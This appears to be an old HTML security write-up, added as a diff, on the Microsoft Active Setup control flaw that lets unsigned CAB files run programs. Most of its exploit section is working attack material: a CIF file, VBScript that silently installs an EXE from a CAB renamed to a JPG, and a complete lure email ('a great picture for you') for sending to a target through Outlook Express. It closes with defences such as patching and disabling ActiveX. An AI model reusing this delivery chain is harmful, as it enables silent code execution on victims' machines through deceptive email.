@@ -1,0 +1,536 @@
+<html>
+
+<head>
+<meta name="description" content="This document provides reference details and an exploit for Microsoft Active Setup control's unsigned CAB file execution vulnerability.">
+<meta name="keywords" content="Active Setup Control Exploit, Microsoft Active Setup Control Exploit, unsigned CAB file execution exploit, CAB, exploit, microsoft, unsigned, file, execution, vulnerability, activex, active, setup, control">
+<title>Microsoft Active Setup Control Exploit</title>
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<p align="center"><font size="4" face="Arial"><strong>Vulnerability
+details and example exploit<br>
+for Microsoft Active Setup control's<br>
+unsigned CAB file execution vulnerability.</strong></font></p>
+
+<blockquote>
+    <p align="left"><font face="Arial"><strong><u>Introduction</u></strong></font></p>
+</blockquote>
+
+<blockquote>
+    <p align="left"><font size="2" face="Arial">Microsoft's
+    Active Setup Control (asctrls.ocx) shipped with Internet
+    Explorer 4 and above has a vulnerability in it as discovered
+    by Juan Carlos Garcia Cuartango </font><a
+    href="mailto:cuartango@teleline.es"><font size="2"
+    face="Arial">&lt;cuartango@teleline.es&gt;</font></a><font
+    size="2" face="Arial">, which was posted on BUGTRAQ (ID 775)
+    in the month of November, 1999. Microsoft has released
+    patches for its control which may be procured from its
+    website. This document aims to provide the actual details of
+    the vulnerability as well as an example exploit.</font></p>
+    <p align="left"><font size="2" face="Arial">NOTE: This is NOT
+    a document on the Microsoft signed software backdoor
+    vulnerability as posted on BUGTRAQ (ID 999) in February 2000.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Disclaimer</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">The material in
+    this document is released AS IS for EDUCATIONAL PURPOSES
+    ONLY. This document may be used by security analysers to
+    monitor how probable crackers may intrude into their systems.
+    The author of this document does not wish to give his opinion
+    on supporting or critisizing vulnerability analysis. You are
+    advised against using any of the material in this document
+    for criminal purposes.</font></p>
+    <p align="left"><font size="2" face="Arial">All responsiblity
+    of action, pros, cons, the cause and effect of your action,
+    is on you. You are responsible for EVERYTHING. The author is
+    in no way responsible for any sort of action which is caused
+    by the material in this document. YOU ARE ON YOUR OWN.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Vulnerability
+    Details</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">On November 8th
+    1999, a public announcement was made that a severe
+    vulnerability existed in Microsoft's Active Setup control
+    which was shipped with Internet Explorer 4 and above. The
+    vulnerability was so severe that almost any kind of break-in
+    was possible into client machines. Email bombs, viruses,
+    criminal acts such as gathering of secret documents, etc. are
+    all very possible with such a security hole.</font></p>
+    <p align="left"><font size="2" face="Arial">Microsoft was
+    quick to release a security bulletin and make patches
+    available on its website. Nobody apart from Microsoft and
+    Juan Carlos Garcia Cuartango knew how to exploit the
+    vulnerability and the whole world was a safer place. Not many
+    knew how to use the Active Setup control as not much
+    information was released to the public about the control. Now
+    that its been quite a while since patches have been made
+    available, I have decided to release an example exploit to
+    implicitly explain what kind of security measures have to be
+    deployed.</font></p>
+    <p align="left"><font size="2" face="Arial">The Active Setup
+    control has a vulnerability which allows the installation of
+    software from unsigned local CAB files. By local files, I
+    mean CAB files on the client machine (as opposed to on the
+    Internet). No checking is done and the contents of the
+    cabinet file are trusted. This is the vulnerability. </font></p>
+    <p align="left"><font size="2" face="Arial">For details on
+    the Active Setup process and using the component, please
+    refer to the links provided at the end of this document. In
+    short words, the Active Setup control is a software component
+    (which may be used in other programs/scripts) to install
+    software. The Active Setup control is used through function
+    calls in the program/script code. An input CAB file contains
+    a list of installation files (including executable files) and
+    a cabinet information file (CIF) which describes what is to
+    be done with the CAB file.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Exploit Details</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">PLEASE READ THE
+    DOCUMENTATION ON THE ACTIVE SETUP CONTROL (given in links
+    below).</font></p>
+    <p align="left"><font size="2" face="Arial">We now examine
+    how this bug may be exploited. Supposing we are able to store
+    an unsigned CAB on the client machine, it becomes local to
+    the client. Hence, we may process the unsigned CAB file using
+    the Active Setup control successfully. We may use an HTML
+    file with VBScript in it to run the control. VBScript has
+    support for ActiveX controls (Active Setup is an ActiveX
+    control). The VBScript is invoked when the HTML file loads.
+    The VBScript then initializes the control with details of
+    where the CAB file is present on the client machine, and asks
+    the control to process the CAB file. The Active Setup control
+    then processes the CAB file, and executes EXE programs
+    archived in the CAB file with NO SECURITY LIMITATIONS. The
+    EXE program may then do anything it wishes to do.</font></p>
+    <p align="left"><font size="2" face="Arial">Now, obviously,
+    there are questions in your head. How do I transfer a CAB
+    file onto the client's machine? The answer is simple. The
+    client user is not mad to download an unsigned CAB file. So
+    you may disguise it as a file of another format (in short
+    words, rename the file's extension). Now, what types of files
+    are implicitly downloaded? HTML, GIF, JPG, etc. which make up
+    a page are downloaded when the user visits a site using
+    Internet Explorer. But these files are stored in temporary
+    directories. Although a CAB file disguised as a JPG file will
+    download onto the local client, where will it be stored? The
+    location is not fixed. When the location can be determined,
+    we may be able to write an exploit for Internet Explorer. But
+    until then, there are other options.</font></p>
+    <p align="left"><font size="2" face="Arial">Hey, what about
+    Outlook Express? Too many people have told me. &quot;DON'T
+    USE OUTLOOK EXPRESS! It's too intelligent.&quot; They are
+    right I guess. Outlook Express uses components of Internet
+    Explorer to handle HTML files. So You can display HTML
+    messages in Outlook express. More important, YOU CAN RUN
+    VBSCRIPTS in Outlook Express.</font></p>
+    <p align="left"><font size="2" face="Arial">How is it going
+    to help? SIMPLE. I attach a file called &quot;x.jpg&quot; to
+    a email and send it to the client, and the client downloads
+    it using Outlook Express. When he/she VIEWS THE EMAIL (when
+    he/she clicks on the subject in the message window), Outlook
+    Express tries to display the attached &quot;x.jpg&quot; file
+    as a JPEG attachment. For this, it saves the JPEG file in the
+    directory pointed by the environment variable TEMP. This is
+    mapped to C:\WINDOWS\TEMP on most machines. So,
+    &quot;x.jpg&quot; is saved as
+    &quot;C:\WINDOWS\TEMP\x.jpg&quot;. Now, if i create a CAB
+    file (with my malicious EXE program in it) and rename it to
+    &quot;x.jpg&quot; and attach it to a email message, it will
+    go to the same location. Outlook Express will fail to display
+    the file (will show an icon with &quot;X&quot; instead). So,
+    I now know the location of the CAB file on the client
+    machine. I can also execute VBScript from the same email
+    message (which contains HTML), which will then create and
+    initialize the Active Setup control to install from the local
+    file (C:\WINDOWS\TEMP\x.jpg). The Active Setup control does
+    not mind the different file extension. Then, when the
+    VBScript asks the control to process the components of the
+    CAB file, the malicious EXE program can execute.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Practical
+    Demonstration</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">First, let us
+    build the CAB file. We have the executable EXE program which
+    has to be executed on the target machine. Let's call it
+    ASDF.EXE. This ASDF.EXE could be a non-interactive program
+    which runs silently (as in a real life cracking scenario)
+    without any visual indication of it running. For our example
+    we may make a copy of NOTEPAD.EXE and call it ASDF.EXE.</font></p>
+    <p align="left"><font size="2" face="Arial">Now, we need to
+    put another file into the CAB. It is a cabinet information
+    file (CIF). An example file is given as follows (with
+    comments). More on creating this file, and fields you can put
+    in it, is present in a description of the Active Setup
+    control given in one of the links at the end of this
+    document.</font></p>
+    <p align="left"><font size="2" face="Courier New">; Start of
+    ASDF.CIF (note: semicolon is for comment)<br>
+    ; Anything in [] means a section<br>
+    <br>
+    [Version]<br>
+    Signature=$Chicago$<br>
+    <br>
+    ; DisplayName gives the name that the Active Setup<br>
+    ; control displays when it tries to install the component<br>
+    ; (if you ask it to display progress indicators, etc.)<br>
+    DisplayName=Active Setup Control Sample Exploit<br>
+    <br>
+    ;Require 1MB of free space to start<br>
+    MinFileSize=1000<br>
+    <br>
+    ; [ASDF] is a section devoted to the dummy<br>
+    ; ASDF component we will fake installing.<br>
+    [ASDF]<br>
+    ; Guess you know this already.<br>
+    DisplayName=ASDF Sample Main Module<br>
+    <br>
+    ; GUID is a unique ID.. guess something unique will do.<br>
+    GUID={AABBCCDD-B00B-FACE-DADA-00AA00BB00CC}<br>
+    <br>
+    ; URLn point to URLs of various CAB files. Our CAB file<br>
+    ; will eventually be disguised (renamed) as a JPG file<br>
+    ; and be stored in &quot;asdf.jpg&quot;. so there.<br>
+    URL1=&quot;ascb.jpg&quot;,3<br>
+    <br>
+    ; Sizen = compressed/actual size of installation files on
+    disk?<br>
+    ; A dummy value greater than size of &quot;ASDF.EXE&quot;
+    should do.<br>
+    Size1=1417,1430<br>
+    <br>
+    ; This is important. Commandn gives the name of the<br>
+    ; command (in the CAB file) to execute when installation<br>
+    ; starts. This will be our EXE file.<br>
+    Command1=&quot;asdf.exe&quot;<br>
+    <br>
+    ; Type of installation. This field is described in the<br>
+    ; documentation for the Active Setup control.<br>
+    Type1=2<br>
+    Version=1,00,1234,0<br>
+    <br>
+    ; 0 = no reboot, 1 = reboot.<br>
+    ; obviously, DON'T REBOOT AFTER INSTALLATION IS COMPLETE!<br>
+    Reboot=0<br>
+    <br>
+    ; Space occupied by the installed files. A dummy value<br>
+    ; greater than size of &quot;ASDF.EXE&quot; should do.<br>
+    InstalledSize=980,524<br>
+    ; End of ASDF.CIF</font></p>
+    <p align="left"><font size="2" face="Arial">We now need a
+    program to create the CAB archive which will contain the two
+    files ASDF.EXE and ASDF.CIF. MAKECAB.EXE, which is included
+    with Microsoft Visual Studio distributions doesn't seem to be
+    able to handle more than one file inside the CAB archive. You
+    may try a shareware program like Archive Explorer available
+    from </font><a href="http://www.dennisre.com/ax/"><font
+    size="2" face="Arial">http://www.dennisre.com/ax/</font></a><font
+    size="2" face="Arial"> to create your CAB files.</font></p>
+    <p align="left"><font size="2" face="Arial">Once your CAB
+    file is created (containing ADSF.EXE and ASDF.CIF), rename
+    the CAB file to ASDF.JPG. Now, the CAB file is ready. Let's
+    move on to the VBScript part.</font></p>
+    <p align="left"><font size="2" face="Arial">Create a HTML
+    file with the following contents. The contents are described
+    with comments in the file itself. No further explanation
+    should be necessary.</font></p>
+    <p align="left"><font size="2" face="Courier New">&lt;!--
+    Start of HTML code --&gt;<br>
+    &lt;HTML&gt;<br>
+    &lt;HEAD&gt;<br>
+    &lt;TITLE&gt;Hi&lt;/TITLE&gt;<br>
+    &lt;/HEAD&gt;<br>
+    <br>
+    &lt;!-- On loading, we execute the VBScript function
+    TryInstall() --&gt;<br>
+    &lt;BODY OnLoad=&quot;TryInstall()&quot;&gt;<br>
+    <br>
+    &lt;!--<br>
+    Create an object with the following classid. The classid<br>
+    is for the HKEY_CLASSES_ROOT\ASControls.InstallEngineCtl<br>
+    and can be verified using REGEDIT.EXE. Call the object
+    &quot;Inst&quot;.<br>
+    This is our Active Setup control we will exploit.<br>
+    --&gt;<br>
+    <br>
+    &lt;object id=&quot;Inst&quot;
+    classid=&quot;CLSID:6E449683-C509-11CF-AAFA-00AA00B6015C&quot;&gt;<br>
+    &lt;/object&gt;<br>
+    <br>
+    &lt;script language=&quot;VBScript&quot;&gt;<br>
+    &lt;!--<br>
+    <br>
+    Sub TryInstall()<br>
+    <br>
+    'Set the BaseUrl to C:\WINDOWS\TEMP<br>
+    'and the CIF file to ASDF.CIF which is inside<br>
+    'ASDF.JPG (which is actually the renamed CAB file).<br>
+    'This is because Outlook Express will save the asdf.jpg<br>
+    'file in C:\WINDOWS\TEMP on most systems.<br>
+    <br>
+    Inst.BaseUrl = &quot;file:///C:/Windows/Temp&quot;<br>
+    Inst.SetCifFile &quot;asdf.jpg&quot;, &quot;asdf.cif&quot;<br>
+    <br>
+    <br>
+    'Now, the installation engine of the Active Setup control<br>
+    'will unpack the CAB file and initialize itself with details<br>
+    'from the included CIF file. But this takes TIME. If this
+    were<br>
+    'Visual Basic, we could have polled Inst.EngineStatus in a
+    loop<br>
+    'with a DoEvents in it. But this won't work in VBScript.<br>
+    'So we will introduce a delay for the engine to initialize
+    itself.<br>
+    'There is no Sleep() function in VBScript :(<br>
+    '<br>
+    'We can simulate a 1/2 second sleep using the following
+    workaround<br>
+    'by splitting up our code into two functions.<br>
+    <br>
+    x = SetTimeout(&quot;DoRest&quot;,500,&quot;VBScript&quot;)<br>
+    <br>
+    End Sub<br>
+    <br>
+    Sub DoRest()<br>
+    <br>
+    'Ah! 1/2 second has passed. So has the engine initialized
+    itself?<br>
+    <br>
+    If Inst.EngineStatus &lt;&gt; 3 Then<br>
+    <br>
+    'Uh oh! We have a problem if EngineStatus &lt;&gt; 3! If you
+    have followed<br>
+    'instructions correctly, this would mean that the 1/2 second
+    delay<br>
+    'was not enough. Or maybe you have installed Microsoft's
+    patches :)<br>
+    'If a larger delay doesn't help, check if the file
+    &quot;ADSF.JPG&quot; exists<br>
+    'in C:\WINDOWS\TEMP and it is a valid CAB file and it
+    contains the<br>
+    'ASDF.CIF and ADSF.EXE files. Check if ASDF.CIF has valid and
+    correct<br>
+    'information.<br>
+    '<br>
+    'The thing anyone would do now would be to silently exit the
+    VBScript and<br>
+    'keep quiet about it.<br>
+    <br>
+    Exit Sub<br>
+    End If<br>
+    <br>
+    'Oh wow! We have things moving now. There were no problems
+    with the<br>
+    'engine initialization.<br>
+    <br>
+    'SetAction sets the action for the [ASCB] module to be
+    1=Install module.<br>
+    'SetAction accepts values other than 1 for uninstall, etc.<br>
+    <br>
+    Inst.SetAction &quot;ASCB&quot;, 1<br>
+    <br>
+    <br>
+    'ProcessComponents is used to start the install (our dummy
+    install).<br>
+    'This will execute the command described by
+    Command1=&quot;asdf.exe&quot; line<br>
+    'in ASDF.CIF file.<br>
+    '<br>
+    'ProcessComponents with an argument of 7 (111 binary) will
+    inhibit<br>
+    'the display of all progress and status and information
+    windows during<br>
+    'the dummy installation.<br>
+    <br>
+    Inst.ProcessComponents 7<br>
+    <br>
+    'Well, if you have come so far, your program ASDF.EXE has
+    already run.<br>
+    'So there.<br>
+    <br>
+    End Sub<br>
+    <br>
+    //--&gt;<br>
+    &lt;/script&gt;<br>
+    <br>
+    &lt;/BODY&gt;<br>
+    &lt;/HTML&gt;<br>
+    &lt;!-- End of HTML code --&gt;</font></p>
+    <p align="left"><font size="2" face="Arial">Now what? Well, I
+    guess it should be simple now. Create an email message
+    containing the above HTML. Attach the ASDF.JPG file to it.
+    Send it to the target client.</font></p>
+    <p align="left"><font size="2" face="Arial">A sample email
+    which you can pipe into /usr/lib/sendmail is given as
+    follows. This will work with Outlook Express.<br>
+    Use &quot;/usr/lib/sendmail -t &lt;
+    the_following_text.txt&quot;.</font></p>
+    <p align="left"><font size="2" face="Courier New">From:
+    Sender &lt;sender@yourhost.com&gt;<br>
+    To: Receipient &lt;receipt@targethost.com&gt;<br>
+    Subject: Hi<br>
+    MIME-Version: 1.0<br>
+    Content-Type: multipart/mixed;<br>
+    boundary=&quot;----=_NextPart_000_0071_01BF2DD4.558D3F20&quot;<br>
+    <br>
+    This is a multi-part message in MIME format.<br>
+    <br>
+    ------=_NextPart_000_0071_01BF2DD4.558D3F20<br>
+    Content-Type: multipart/alternative;<br>
+    boundary=&quot;----=_NextPart_001_0072_01BF2DD4.558D3F20&quot;<br>
+    <br>
+    <br>
+    ------=_NextPart_001_0072_01BF2DD4.558D3F20<br>
+    Content-Type: text/plain;<br>
+    charset=&quot;us-ascii&quot;<br>
+    <br>
+    Here is a great picture for you....!!!<br>
+    <br>
+    <br>
+    ------=_NextPart_001_0072_01BF2DD4.558D3F20<br>
+    Content-Type: text/html;<br>
+    charset=&quot;us-ascii&quot;<br>
+    <br>
+    &lt;HTML&gt;<br>
+    &lt;HEAD&gt;<br>
+    &lt;TITLE&gt;Hi&lt;/TITLE&gt;<br>
+    &lt;/HEAD&gt;<br>
+    &lt;BODY OnLoad=&quot;TryInstall()&quot;&gt;<br>
+    <br>
+    Here is a great picture for you....!!!<br>
+    <br>
+    &lt;object id=&quot;Inst&quot;
+    classid=&quot;CLSID:6E449683-C509-11CF-AAFA-00AA00B6015C&quot;&gt;<br>
+    &lt;/object&gt;<br>
+    <br>
+    &lt;script language=&quot;VBScript&quot;&gt;<br>
+    &lt;!--<br>
+    <br>
+    Sub TryInstall()<br>
+    <br>
+    Inst.BaseUrl = &quot;file:///C:/Windows/Temp&quot;<br>
+    Inst.SetCifFile &quot;asdf.jpg&quot;, &quot;asdf.cif&quot;<br>
+    <br>
+    x = SetTimeout(&quot;DoRest&quot;,500,&quot;VBScript&quot;)<br>
+    <br>
+    End Sub<br>
+    <br>
+    Sub DoRest()<br>
+    If Inst.EngineStatus &lt;&gt; 3 Then<br>
+    Exit Sub<br>
+    End If<br>
+    <br>
+    Inst.SetAction &quot;ASDF&quot;, 1<br>
+    Inst.ProcessComponents 7<br>
+    <br>
+    End Sub<br>
+    <br>
+    //--&gt;<br>
+    &lt;/script&gt;<br>
+    <br>
+    &lt;/BODY&gt;<br>
+    &lt;/HTML&gt;<br>
+    <br>
+    ------=_NextPart_001_0072_01BF2DD4.558D3F20--<br>
+    <br>
+    ------=_NextPart_000_0071_01BF2DD4.558D3F20<br>
+    Content-Type: image/jpeg;<br>
+    name=&quot;asdf.jpg&quot;<br>
+    Content-Transfer-Encoding: base64<br>
+    Content-Disposition: attachment;<br>
+    filename=&quot;asdf.jpg&quot;<br>
+    <br>
+    TVNDRgAAAACaSAAAAAAAACwAAAAAAAAAAwEBAAIAAADKUQAAXgAAAAIAAxUA0AAAAAAAAAAA<br>
+    <br>
+    YOUR MIME ENCODED ASDF.JPG FILE (CABINET FILE)<br>
+    GOES HERE. use &quot;mimencode&quot; to encode your file.<br>
+    <br>
+    JzyP5RPpLP721w5JQuJDq4X9V+Lg9T+5N/TYlKJPQO5OhkNNxv/C5VJSf1mvnD/dkpPBfy+X<br>
+    seZRxIgSPp8AAA==<br>
+    <br>
+    ------=_NextPart_000_0071_01BF2DD4.558D3F20--<br>
+    <br>
+    .</font></p>
+    <p align="left"><font size="2" face="Arial">Place your MIME
+    base64 encoded ASDF.JPG file in the place shown above. Remove
+    the lines with the junk characters (watch the spacing). They
+    are retained above as delimiters for your reference. You
+    should put your own MIME encoded ASDF.JPG in place of it. You
+    can MIME encode your file using the &quot;mimencode&quot;
+    program.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Cons and
+    defences</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">This bug is BIG.
+    Anyone can do anything with your computer if you use Outlook
+    Express and have not taken precautionary measures. The threat
+    of email viruses, email bombs, etc. cannot be ruled out. More
+    importantly, if your computer contains classified data, this
+    can easily be transferred out. Proxies and firewalls cannot
+    prevent any damage!</font></p>
+    <p align="left"><font size="2" face="Arial">What can be done?</font></p>
+    <p align="left"><font size="2" face="Arial">1. Download the
+    patches from Microsoft's website for the Active Setup control
+    and install them.<br>
+    2. Junk Outlook Express. It is too intelligent. Use a simple
+    e-mail client such as PINE.<br>
+    3. Set your TEMP directory to something else.<br>
+    4. Disable all ActiveX component execution (High security
+    zone).</font></p>
+    <p align="left"><font face="Arial"><strong><u>Links</u></strong></font></p>
+    <p align="left"><a
+    href="http://www.securityfocus.com/bid/775/"><font size="2"
+    face="Arial">http://www.securityfocus.com/bid/775/</font></a><font
+    size="2" face="Arial"> - Active Setup control vulnerability
+    details on securityfocus.com.<br>
+    </font><a
+    href="http://msdn.microsoft.com/library/periodic/period98/vbpj0798.htm"><font
+    size="2" face="Arial">http://msdn.microsoft.com/library/periodic/period98/vbpj0798.htm</font></a><font
+    size="2" face="Arial"> - Documentation on the Active Setup
+    control.<br>
+    </font><a
+    href="http://www.microsoft.com/technet/security/bulletin/fq99-048.asp"><font
+    size="2" face="Arial">http://www.microsoft.com/technet/security/bulletin/fq99-048.asp</font></a><font
+    size="2" face="Arial"> - Microsoft's security bulletin for
+    the vulnerability.<br>
+    </font><a
+    href="http://www.microsoft.com/msdownload/iebuild/ascontrol/en/ascontrol.htm"><font
+    size="2" face="Arial">http://www.microsoft.com/msdownload/iebuild/ascontrol/en/ascontrol.htm</font></a><font
+    size="2" face="Arial"> - Microsoft's update for the control.<br>
+    </font><a
+    href="http://pages.whowhere.com/computers/cuartangojc/"><font
+    size="2" face="Arial">http://pages.whowhere.com/computers/cuartangojc/</font></a><font
+    size="2" face="Arial"> - Juan Carlos Garcia Cuartango's
+    pages.<br>
+    </font><a href="http://www.securityfocus.com/"><font size="2"
+    face="Arial">http://www.securityfocus.com/</font></a><font
+    size="2" face="Arial"> - Security news, BUGTRAQ, security
+    related utilities, etc.</font></p>
+    <p align="left"><font face="Arial"><strong><u>Author</u></strong></font></p>
+    <p align="left"><font size="2" face="Arial">I'm a student of
+    M.Sc. Computer Science. I do security analysis, Linux network
+    security, web development, 3D-game programming, demos,
+    network programming, data compression, etc. I know C, x86
+    asm. My primary development platform has been Linux for the
+    past 5 years. I love music.</font></p>
+    <p align="left"><font size="2" face="Arial">I trust
+    opensource systems.</font></p>
+    <p align="left"><font size="2" face="Arial">This bug scares
+    me and sometimes makes me laugh too. After working on
+    numerous vulnerabilities which needed setting up byte
+    sequences to exploit buffer overflows, and other stuff, this
+    vulnerability comes along. And it says, roll your own EXE
+    file, transfer and execute it on any machine. Beats
+    everything I have seen so far.</font></p>
+    <p align="left"><font size="2" face="Arial">Please educate
+    people about this bug. This bug is more severe than it seems.
+    Spread the word asking people to download the patches off
+    Microsoft's site and install them.</font></p>
+    <p align="left"><font size="2" face="Arial">PS: Although I
+    would love to hear from you, please DO NOT bomb me with mail
+    ;) Please keep your discussions on this topic on BUGTRAQ as
+    much as you can. You can get all the information you need in
+    this document and by following the links given above.</font></p>
+    <p align="left"><font size="2" face="Arial">Cheers!<br>
+    Mukund </font><a href="mailto:muks@crosswinds.net"><font
+    size="2" face="Arial">&lt;muks@crosswinds.net&gt;</font></a></p>
+</blockquote>
+</body>
+</html>
+
